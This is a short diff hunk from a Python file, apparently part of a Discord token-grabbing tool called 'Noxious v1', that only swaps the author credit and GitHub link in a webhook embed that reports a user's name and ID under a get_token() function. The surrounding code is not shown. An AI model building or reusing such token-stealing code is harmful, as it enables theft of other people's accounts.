@@ -135,11 +135,11 @@ def get_token():
                             "title": user_name,
                             "color": 0x000000,
                             "author": {
-                                "name": "Noxious v1 - Made by veal1",
+                                "name": "Noxious v1 - Made by Resentful",
                                 "icon_url": "https://imgur.com/a/WKgRuYj"
                             },
                             "footer": {
-                                "text": "Dev Veal | https://github.com/realveal"
+                                "text": "Dev Veal | https://github.com/resentful1"
                             },
                             "fields": [
                                 {"name": "User ID", "value": user_id, "inline": True},
